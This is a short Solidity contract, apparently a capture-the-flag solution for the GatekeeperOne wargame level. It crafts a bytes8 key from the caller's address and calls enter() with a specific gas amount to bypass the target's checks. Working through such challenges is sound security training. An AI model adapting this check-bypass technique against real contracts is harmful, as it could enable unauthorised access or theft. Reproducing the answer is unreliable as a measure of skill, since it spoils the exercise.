// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract Solution {
    GatekeeperOne gatekeeper;

    constructor(address _addr) public {
        gatekeeper = GatekeeperOne(_addr);
    }

    function solve() public {
        bytes8 key = bytes8((1 << 63) + uint16(msg.sender));
        gatekeeper.enter{gas: 254 + 8191 * 10}(key);
    }
}
